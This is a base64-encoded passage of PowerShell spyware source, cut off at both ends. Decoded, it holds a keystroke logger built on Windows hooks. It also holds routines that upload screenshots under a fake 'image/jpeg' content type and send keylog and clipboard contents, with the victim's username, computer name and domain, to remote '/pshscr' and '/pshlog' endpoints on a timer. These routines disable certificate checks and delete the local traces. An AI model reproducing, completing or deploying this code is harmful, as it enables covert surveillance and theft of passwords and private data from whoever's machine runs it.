YXJ0LUpvYiAtU2NyaXB0QmxvY2sgeyYgY21kIC9jICRhcmdzWzBdfSAtQXJndW1lbnRMaXN0ICRjbWQKICAgICAgICAgICAgICAgICAgIFdyaXRlLUhvc3QgJGFyZ3NbMF0KICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgfX19CiAgICAgICAgICAgICRXZWJHZXRUaW1lciA9IDEyMDAKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFdlYkdldFRpbWVyCiAgICAgICAgICAgIH0KICAgICAgICB9IC1Bcmd1bWVudExpc3QgJHBhcmFtcy51cmwsICRwYXJhbXMucmVzb2x1dGlvbiwgJHBhcmFtcy5kb21haW4sICRwYXJhbXMuY29tcHV0ZXJfbmFtZSwgJHBhcmFtcy51c2VybmFtZSwgJHBhcmFtcy50aW1lem9uZSwgJHBhcmFtcy5oYXNoaWQsICRwYXJhbXMudmVyc2lvbgogICAgfQoKZnVuY3Rpb24gUG9zdEZpbGUoJGZpbGVfbmFtZSkgewokbmFtZSA9IChHZXQtQ2hpbGRJdGVtICRmaWxlX25hbWUpLm5hbWUKJGJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRmaWxlX25hbWUpCiRlbmMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpHZXRFbmNvZGluZygkY29kZVBhZ2VOYW1lKQokZGF0YSA9ICRlbmMuR2V0U3RyaW5nKCRieXRlcykKCltTeXN0ZW0uTmV0LldlYlJlcXVlc3RdJHdlYlJlcXVlc3QgPSBbU3lzdGVtLk5ldC5XZWJSZXF1ZXN0XTo6Q3JlYXRlKCRwYXJhbXMudXJsKycvcHNoc2NyJykKW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0geyAkdHJ1ZSB9CiR3ZWJSZXF1ZXN0LkNvbnRlbnRUeXBlID0gImltYWdlL2pwZWciCiR3ZWJSZXF1ZXN0Lk1ldGhvZCA9ICJQT1NUIgpbYnl0ZVtdXSRieXRlcyA9ICRlbmMuR2V0Qnl0ZXMoJGRhdGEpOwokd2ViUmVxdWVzdC5Db250ZW50TGVuZ3RoID0gJGJ5dGVzLkxlbmd0aDsKJHdlYlJlcXVlc3QuSGVhZGVycy5hZGQoJ2NvbnRlbnQtZGlzcG9zaXRpb24nLCAiZmlsZT0kbmFtZSIpCiR3ZWJSZXF1ZXN0LkhlYWRlcnMuYWRkKCdoYXNoaWQnLCAkcGFyYW1zLmhhc2hpZCkKJHdlYlJlcXVlc3QuSGVhZGVycy5hZGQoJ2NvbXB1dGVyX25hbWUnLCAkcGFyYW1zLmNvbXB1dGVyX25hbWUpCiR3ZWJSZXF1ZXN0LkhlYWRlcnMuYWRkKCdkb21haW4nLCAkcGFyYW1zLmRvbWFpbikKJHdlYlJlcXVlc3QuSGVhZGVycy5hZGQoJ3VzZXJuYW1lJywgJHBhcmFtcy51c2VybmFtZSkKW1N5c3RlbS5JTy5TdHJlYW1dJHJlcVN0cmVhbSA9ICR3ZWJSZXF1ZXN0LkdldFJlcXVlc3RTdHJlYW0oKQokcmVxU3RyZWFtLldyaXRlKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCk7CiRyZXFTdHJlYW0uRmx1c2goKTsKCiRyZXNwID0gJHdlYlJlcXVlc3QuR2V0UmVzcG9uc2UoKTsKJHJzID0gJHJlc3AuR2V0UmVzcG9uc2VTdHJlYW0oKTsKW1N5c3RlbS5JTy5TdHJlYW1SZWFkZXJdJHNyID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyIC1hcmd1bWVudExpc3QgJHJzOwokc3IuUmVhZFRvRW5kKCk7Cgp9CgoKCmZ1bmN0aW9uIFdlYlBvc3QgewogICAgJHBzaGxvZ191cmwgPSAkcGFyYW1zLnVybCsiL3BzaGxvZyIKICAgIHdoaWxlICgkdHJ1ZSkgewogICAgICAgICRXZWJQb3N0VGltZXIgPSAxMjAwCiAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFdlYlBvc3RUaW1lcgogICAgICAgIFdyaXRlLWhvc3QgJHBhcmFtcy5sb2dfZmlsZQogICAgICAgIElmIChUZXN0LVBhdGggJGxvZ19maWxlKSB7IAogICAgICAgICAgICAjJGNvbnRlbnQgPSBbSU8uRmlsZV06OlJlYWRBbGxUZXh0KCRwYXJhbXMubG9nX2ZpbGUpCiAgICAgICAgICAgICRhYWEgPSBHZXQtQ29udGVudCAkcGFyYW1zLmxvZ19maWxlCiAgICAgICAgICAgICRjb250ZW50ID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkYWFhKSkKICAgICAgICAgICAgJGpzb24gPSBAeyJyZXNvbHV0aW9uIiA9ICRwYXJhbXMucmVzb2x1dGlvbjsgImRvbWFpbiIgPSAkcGFyYW1zLmRvbWFpbjsgImNvbXB1dGVyX25hbWUiID0gJHBhcmFtcy5jb21wdXRlcl9uYW1lOyAidXNlcm5hbWUiID0gJHBhcmFtcy51c2VybmFtZTsgInRpbWV6b25lIiA9ICRwYXJhbXMudGltZXpvbmU7ICJoYXNoaWQiID0gJHBhcmFtcy5oYXNoaWQ7ICJ2ZXJzaW9uIiA9ICRwYXJhbXMudmVyc2lvbjsgImNvbnRlbnQiID0gJGNvbnRlbnQ7ICJ0eXBlIiA9ICJrZXlsb2cifQogICAgICAgICAgICAkbG9nX2pzb24gPSAkanNvbiB8IENvbnZlcnRUby1Kc29uCiAgICAgICAgICAgIFdyaXRlLUhvc3QgJGxvZ19qc29uCiAgICAgICAgICAgICRidWZmZXIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRsb2dfanNvbikKICAgICAgICAgICAgW1N5c3RlbS5OZXQuSHR0cFdlYlJlcXVlc3RdICR3ZWJSZXF1ZXN0ID0gW1N5c3RlbS5OZXQuV2ViUmVxdWVzdF06OkNyZWF0ZSgkcHNobG9nX3VybCkKICAgICAgICAgICAgW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0geyAkdHJ1ZSB9CiAgICAgICAgICAgICR3ZWJSZXF1ZXN0LkNvbnRlbnRUeXBlID0gImFwcGxpY2F0aW9uL2pzb24iCiAgICAgICAgICAgICR3ZWJSZXF1ZXN0LlRpbWVvdXQgPSAxMDAwMAogICAgICAgICAgICAkd2ViUmVxdWVzdC5NZXRob2QgPSAiUE9TVCIKICAgICAgICAgICAgJHdlYlJlcXVlc3QuQ29udGVudExlbmd0aCA9ICRidWZmZXIuTGVuZ3RoOwoKCiAgICAgICAgICAgICRyZXF1ZXN0U3RyZWFtID0gJHdlYlJlcXVlc3QuR2V0UmVxdWVzdFN0cmVhbSgpCiAgICAgICAgICAgICRyZXF1ZXN0U3RyZWFtLldyaXRlKCRidWZmZXIsIDAsICRidWZmZXIuTGVuZ3RoKQogICAgICAgICAgICAkcmVxdWVzdFN0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICRyZXF1ZXN0U3RyZWFtLkNsb3NlKCkKCiAgICAgICAgICAgIFtTeXN0ZW0uTmV0Lkh0dHBXZWJSZXNwb25zZV0gJHdlYlJlc3BvbnNlID0gJHdlYlJlcXVlc3QuR2V0UmVzcG9uc2UoKQogICAgICAgICAgICAkc3RyZWFtUmVhZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKCR3ZWJSZXNwb25zZS5HZXRSZXNwb25zZVN0cmVhbSgpKQogICAgICAgICAgICAkcmVzdWx0ID0gJHN0cmVhbVJlYWRlci5SZWFkVG9FbmQoKQogICAgICAgICAgICBSZW1vdmUtSXRlbSAkbG9nX2ZpbGUKfQogICAgICAgIGlmIChUZXN0LVBhdGggIiRlbnY6VGVtcFxBcHBsbnNpZ2h0c19WaXN1YWxTdHVkaW8udHh0IikgewogICAgICAgICAgICAKICAgICAgICAgICAgJGNsaXBmaWxlID0gIiRlbnY6VGVtcFxBcHBsbnNpZ2h0c19WaXN1YWxTdHVkaW8udHh0IgogICAgICAgICAgICAkYWFhID0gR2V0LUNvbnRlbnQgJGNsaXBmaWxlIHwgT3V0LVN0cmluZwogICAgICAgICAgICAkY29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGFhYSkpCiAgICAgICAgICAgIAogICAgICAgICAgICAkanNvbiA9IEB7InJlc29sdXRpb24iID0gJHBhcmFtcy5yZXNvbHV0aW9uOyAiZG9tYWluIiA9ICRwYXJhbXMuZG9tYWluOyAiY29tcHV0ZXJfbmFtZSIgPSAkcGFyYW1zLmNvbXB1dGVyX25hbWU7ICJ1c2VybmFtZSIgPSAkcGFyYW1zLnVzZXJuYW1lOyAidGltZXpvbmUiID0gJHBhcmFtcy50aW1lem9uZTsgImhhc2hpZCIgPSAkcGFyYW1zLmhhc2hpZDsgInZlcnNpb24iID0gJHBhcmFtcy52ZXJzaW9uOyAiY29udGVudCIgPSAkY29udGVudDsgInR5cGUiID0gImNsaXBib2FyZCJ9CiAgICAgICAgICAgICRsb2dfanNvbiA9ICRqc29uIHwgQ29udmVydFRvLUpzb24KICAgICAgICAgICAgd3JpdGUtaG9zdCAkbG9nX2pzb24KICAgICAgICAgICAgJGJ1ZmZlciA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGxvZ19qc29uKQogICAgICAgICAgICBbU3lzdGVtLk5ldC5IdHRwV2ViUmVxdWVzdF0gJHdlYlJlcXVlc3QgPSBbU3lzdGVtLk5ldC5XZWJSZXF1ZXN0XTo6Q3JlYXRlKCIkcHNobG9nX3VybCIpCiAgICAgICAgICAgIFtTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjayA9IHsgJHRydWUgfQogICAgICAgICAgICAkd2ViUmVxdWVzdC5Db250ZW50VHlwZSA9ICJhcHBsaWNhdGlvbi9qc29uIgogICAgICAgICAgICAkd2ViUmVxdWVzdC5UaW1lb3V0ID0gMTAwMDAKICAgICAgICAgICAgJHdlYlJlcXVlc3QuTWV0aG9kID0gIlBPU1QiCiAgICAgICAgICAgICR3ZWJSZXF1ZXN0LkNvbnRlbnRMZW5ndGggPSAkYnVmZmVyLkxlbmd0aDsKCgogICAgICAgICAgICAkcmVxdWVzdFN0cmVhbSA9ICR3ZWJSZXF1ZXN0LkdldFJlcXVlc3RTdHJlYW0oKQogICAgICAgICAgICAkcmVxdWVzdFN0cmVhbS5Xcml0ZSgkYnVmZmVyLCAwLCAkYnVmZmVyLkxlbmd0aCkKICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0uRmx1c2goKQogICAgICAgICAgICAkcmVxdWVzdFN0cmVhbS5DbG9zZSgpCgogICAgICAgICAgICBbU3lzdGVtLk5ldC5IdHRwV2ViUmVzcG9uc2VdICR3ZWJSZXNwb25zZSA9ICR3ZWJSZXF1ZXN0LkdldFJlc3BvbnNlKCkKICAgICAgICAgICAgJHN0cmVhbVJlYWRlciA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVJlYWRlcigkd2ViUmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKSkKICAgICAgICAgICAgJHJlc3VsdCA9ICRzdHJlYW1SZWFkZXIuUmVhZFRvRW5kKCkKICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gJGNsaXBmaWxlCn0KCgogICAgICAgICRkaXJlY3RvcnlJbmZvID0gR2V0LUNoaWxkSXRlbSAkU2NyZWVuc2hvdFBhdGgKICAgICAgICBJZiAoJGRpcmVjdG9yeUluZm8pIHsKICAgICAgICAgICAgJGRpcmVjdG9yeUluZm8gfCBGb3JFYWNoLU9iamVjdCB7IAogICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAkXy5GdWxsTmFtZQogICAgICAgICAgICAgICAgUG9zdEZpbGUoJF8uRnVsbE5hbWUpCiAgICAgICAgICAgICAgICBSZW1vdmUtSXRlbSAkXy5GdWxsTmFtZQogICAgICAgIH0KfQp9Cn0KCgpmdW5jdGlvbiBHZXQtS2V5c3Ryb2tlcyB7CjwjCi5TWU5PUFNJUwoKLlBBUkFNRVRFUiBMb2dQYXRoCgoJU3BlY2lmaWVzIHRoZSBwYXRoIHdoZXJlIHByZXNzZWQga2V5IGRldGFpbHMgd2lsbCBiZSBsb2dnZWQuIEJ5IGRlZmF1bHQsIGtleXN0cm9rZXMgYXJlIGxvZ2dlZCB0byAlVEVNUCVca2V5LmxvZy4KCi5QQVJBTUVURVIgVGltZW91dAoKCVNwZWNpZmllcyB0aGUgaW50ZXJ2YWwgaW4gbWludXRlcyB0byBjYXB0dXJlIGtleXN0cm9rZXMuIEJ5IGRlZmF1bHQsIGtleXN0cm9rZXMgYXJlIGNhcHR1cmVkIGluZGVmaW5pdGVseS4KCi5QQVJBTUVURVIgUGFzc1RocnUKCglSZXR1cm5zIHRoZSBrZXlsb2dnZXIncyBQb3dlclNoZWxsIG9iamVjdCwgc28gdGhhdCBpdCBtYXkgbWFuaXB1bGF0ZWQgKGRpc3Bvc2VkKSBieSB0aGUgdXNlcjsgcHJpbWFyaWx5IGZvciB0ZXN0aW5nIHB1cnBvc2VzLgoKLkVYQU1QTEUKCglHZXQtS2V5c3Ryb2tlcyAtTG9nUGF0aCBDOlxrZXkubG9nCgouRVhBTVBMRQoKCUdldC1LZXlzdHJva2VzIC1UaW1lb3V0IDIwCiAgICAKLkxJTksKCglodHRwOi8vd3d3Lm9ic2N1cmVzZWMuY29tLwoJaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vCglodHRwczovL2dpdGh1Yi5jb20vc2VjYWJzdHJhY3Rpb24KCWh0dHBzOi8vZ2l0aHViLmNvbS9haGhoL1BTU0UKCQojPgoJW0NtZGxldEJpbmRpbmcoKV0gCglQYXJhbSAoCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDApXQoJCVtWYWxpZGF0ZVNjcmlwdCh7VGVzdC1QYXRoIChSZXNvbHZlLVBhdGggKFNwbGl0LVBhdGggLVBhcmVudCAtUGF0aCAkXykpIC1QYXRoVHlwZSBDb250YWluZXJ9KV0KCQlbU3RyaW5nXSRMb2dQYXRoID0gIiQoJGVudjpURU1QKVxrZXkubG9nIiwKCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxKV0KCQlbRG91YmxlXSRUaW1lb3V0LAoJCgkJW1BhcmFtZXRlcigpXQoJCVtTd2l0Y2hdJFBhc3NUaHJ1CgkpCgkKCSRMb2dQYXRoID0gSm9pbi1QYXRoIChSZXNvbHZlLVBhdGggKFNwbGl0LVBhdGggLVBhcmVudCAkTG9nUGF0aCkpIChTcGxpdC1QYXRoIC1MZWFmICRMb2dQYXRoKQoJCgl0cnkgeyAnIlR5cGVkS2V5IiwiV2luZG93VGl0bGUiLCJUaW1lIicgfCBPdXQtRmlsZSAtRmlsZVBhdGggJExvZ1BhdGggLUVuY29kaW5nIHVuaWNvZGUgfQoJY2F0Y2ggeyB0aHJvdyAkXyB9CgkKCSRTY3JpcHQgPSB7CgkJUGFyYW0gKAoJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCldCgkJCVtTdHJpbmddJExvZ1BhdGgsCgkKCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXQoJCQlbRG91YmxlXSRUaW1lb3V0CgkJKQoJCgkJZnVuY3Rpb24gbG9jYWw6R2V0LURlbGVnYXRlVHlwZSB7CgkJCVBhcmFtICgKCQkJCVtPdXRwdXRUeXBlKFtUeXBlXSldCgkJCQoJCQkJW1BhcmFtZXRlciggUG9zaXRpb24gPSAwKV0KCQkJCVtUeXBlW11dCgkJCQkkUGFyYW1ldGVycyA9IChOZXctT2JqZWN0IFR5cGVbXSgwKSksCgkJCQoJCQkJW1BhcmFtZXRlciggUG9zaXRpb24gPSAxICldCgkJCQlbVHlwZV0KCQkJCSRSZXR1cm5UeXBlID0gW1ZvaWRdCgkJCSkKCQoJCQkkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4KCQkJJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBSZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKQoJCQkkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bkFzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pCgkJCSRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkKCQkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQoJCQkkQ29uc3RydWN0b3JCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJFBhcmFtZXRlcnMpCgkJCSRDb25zdHJ1Y3RvckJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCgkJCSRNZXRob2RCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJFJldHVyblR5cGUsICRQYXJhbWV0ZXJzKQoJCQkkTWV0aG9kQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCQkKCQkJJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCX0KCQlmdW5jdGlvbiBsb2NhbDpHZXQtUHJvY0FkZHJlc3MgewoJCQlQYXJhbSAoCgkJCQlbT3V0cHV0VHlwZShbSW50UHRyXSldCgkJCgkJCQlbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlICldCgkJCQlbU3RyaW5nXQoJCQkJJE1vZHVsZSwKCQkJCgkJCQlbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlICldCgkJCQlbU3RyaW5nXQoJCQkJJFByb2NlZHVyZQoJCQkpCgkKCQkJIyBHZXQgYSByZWZlcmVuY2UgdG8gU3lzdGVtLmRsbCBpbiB0aGUgR0FDCgkJCSRTeXN0ZW1Bc3NlbWJseSA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8CgkJCQlXaGVyZS1PYmplY3QgeyAkXy5HbG9iYWxBc3NlbWJseUNhY2hlIC1BbmQgJF8uTG9jYXRpb24uU3BsaXQoJ1xcJylbLTFdLkVxdWFscygnU3lzdGVtLmRsbCcpIH0KCQkJJFVuc2FmZU5hdGl2ZU1ldGhvZHMgPSAkU3lzdGVtQXNzZW1ibHkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJCQkjIEdldCBhIHJlZmVyZW5jZSB0byB0aGUgR2V0TW9kdWxlSGFuZGxlIGFuZCBHZXRQcm9jQWRkcmVzcyBtZXRob2RzCgkJCSRHZXRNb2R1bGVIYW5kbGUgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldE1vZHVsZUhhbmRsZScpCgkJCSRHZXRQcm9jQWRkcmVzcyA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0UHJvY0FkZHJlc3MnKQoJCQkjIEdldCBhIGhhbmRsZSB0byB0aGUgbW9kdWxlIHNwZWNpZmllZAoJCQkkS2VybjMySGFuZGxlID0gJEdldE1vZHVsZUhhbmRsZS5JbnZva2UoJG51bGwsIEAoJE1vZHVsZSkpCgkJCSR0bXBQdHIgPSBOZXctT2JqZWN0IEludFB0cgoJCQkkSGFuZGxlUmVmID0gTmV3LU9iamVjdCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmKCR0bXBQdHIsICRLZXJuMzJIYW5kbGUpCgkJCgkJCSMgUmV0dXJuIHRoZSBhZGRyZXNzIG9mIHRoZSBmdW5jdGlvbgoJCQkkR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRudWxsLCBAKFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdJEhhbmRsZVJlZiwgJFByb2NlZHVyZSkpCgkJfQoJCgkJI3JlZ2lvbiBJbXBvcnRzCgkKCQlbdm9pZF1bUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoJ1N5c3RlbS5XaW5kb3dzLkZvcm1zJykKCQoJCSMgU2V0V2luZG93c0hvb2tFeAoJCSRTZXRXaW5kb3dzSG9va0V4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIFNldFdpbmRvd3NIb29rRXhBCgkJJFNldFdpbmRvd3NIb29rRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50MzJdLCBbTXVsdGljYXN0RGVsZWdhdGVdLCBbSW50UHRyXSwgW0ludDMyXSkgKFtJbnRQdHJdKQoJCSRTZXRXaW5kb3dzSG9va0V4ID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkU2V0V2luZG93c0hvb2tFeEFkZHIsICRTZXRXaW5kb3dzSG9va0V4RGVsZWdhdGUpCgkKCQkjIENhbGxOZXh0SG9va0V4CgkJJENhbGxOZXh0SG9va0V4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIENhbGxOZXh0SG9va0V4CgkJJENhbGxOZXh0SG9va0V4RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKQoJCSRDYWxsTmV4dEhvb2tFeCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENhbGxOZXh0SG9va0V4QWRkciwgJENhbGxOZXh0SG9va0V4RGVsZWdhdGUpCgkKCQkjIFVuaG9va1dpbmRvd3NIb29rRXgKCQkkVW5ob29rV2luZG93c0hvb2tFeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgdXNlcjMyLmRsbCBVbmhvb2tXaW5kb3dzSG9va0V4CgkJJFVuaG9va1dpbmRvd3NIb29rRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSkgKFtWb2lkXSkKCQkkVW5ob29rV2luZG93c0hvb2tFeCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFVuaG9va1dpbmRvd3NIb29rRXhBZGRyLCAkVW5ob29rV2luZG93c0hvb2tFeERlbGVnYXRlKQoJCgkJIyBQZWVrTWVzc2FnZQoJCSRQZWVrTWVzc2FnZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgdXNlcjMyLmRsbCBQZWVrTWVzc2FnZUEKCQkkUGVla01lc3NhZ2VEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbVm9pZF0pCgkJJFBlZWtNZXNzYWdlID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkUGVla01lc3NhZ2VBZGRyLCAkUGVla01lc3NhZ2VEZWxlZ2F0ZSkKCQoJCSMgR2V0QXN5bmNLZXlTdGF0ZQoJCSRHZXRBc3luY0tleVN0YXRlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIEdldEFzeW5jS2V5U3RhdGUKCQkkR2V0QXN5bmNLZXlTdGF0ZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtXaW5kb3dzLkZvcm1zLktleXNdKSAoW0ludDE2XSkKCQkkR2V0QXN5bmNLZXlTdGF0ZSA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldEFzeW5jS2V5U3RhdGVBZGRyLCAkR2V0QXN5bmNLZXlTdGF0ZURlbGVnYXRlKQoJCgkJIyBHZXRGb3JlZ3JvdW5kV2luZG93CgkJJEdldEZvcmVncm91bmRXaW5kb3dBZGRyID0gR2V0LVByb2NBZGRyZXNzIHVzZXIzMi5kbGwgR2V0Rm9yZWdyb3VuZFdpbmRvdwoJCSRHZXRGb3JlZ3JvdW5kV2luZG93RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoKSAoW0ludFB0cl0pCgkJJEdldEZvcmVncm91bmRXaW5kb3cgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRGb3JlZ3JvdW5kV2luZG93QWRkciwgJEdldEZvcmVncm91bmRXaW5kb3dEZWxlZ2F0ZSkKCQoJCSMgR2V0V2luZG93VGV4dAoJCSRHZXRXaW5kb3dUZXh0QWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIEdldFdpbmRvd1RleHRBCgkJJEdldFdpbmRvd1RleHREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1RleHQuU3RyaW5nQnVpbGRlcl0sIFtJbnQzMl0pIChbVm9pZF0pCgkJJEdldFdpbmRvd1RleHQgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRXaW5kb3dUZXh0QWRkciwgJEdldFdpbmRvd1RleHREZWxlZ2F0ZSkKCQoJCSMgR2V0TW9kdWxlSGFuZGxlCgkJJEdldE1vZHVsZUhhbmRsZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEdldE1vZHVsZUhhbmRsZUEKCQkkR2V0TW9kdWxlSGFuZGxlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1N0cmluZ10pIChbSW50UHRyXSkKCQkkR2V0TW9kdWxlSGFuZGxlID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0TW9kdWxlSGFuZGxlQWRkciwgJEdldE1vZHVsZUhhbmRsZURlbGVnYXRlKQoJCgkJI2VuZHJlZ2lvbiBJbXBvcnRzCgkKCQkkQ2FsbGJhY2tTY3JpcHQgPSB7CgkJCVBhcmFtICgKCQkJCVtQYXJhbWV0ZXIoKV0KCQkJCVtJbnQzMl0kQ29kZSwKCQoJCQkJW1BhcmFtZXRlcigpXQoJCQkJW0ludFB0cl0kd1BhcmFtLAoJCgkJCQlbUGFyYW1ldGVyKCldCgkJCQlbSW50UHRyXSRsUGFyYW0KCQkJKQoJCgkJCSRLZXlzID0gW1dpbmRvd3MuRm9ybXMuS2V5c10KCQkKCQkJJE1zZ1R5cGUgPSAkd1BhcmFtLlRvSW50MzIoKQoJCgkJCSMgUHJvY2VzcyBXTV9LRVlET1dOICYgV01fU1lTS0VZRE9XTiBtZXNzYWdlcwoJCQlpZiAoJENvZGUgLWdlIDAgLWFuZCAoJE1zZ1R5cGUgLWVxIDB4MTAwIC1vciAkTXNnVHlwZSAtZXEgMHgxMDQpKSB7CgkJCQoJCQkJJGhXaW5kb3cgPSAkR2V0Rm9yZWdyb3VuZFdpbmRvdy5JbnZva2UoKQoJCgkJCQkkU2hpZnRTdGF0ZSA9ICRHZXRBc3luY0tleVN0YXRlLkludm9rZSgkS2V5czo6U2hpZnRLZXkpCgkJCQlpZiAoKCRTaGlmdFN0YXRlIC1iYW5kIDB4ODAwMCkgLWVxIDB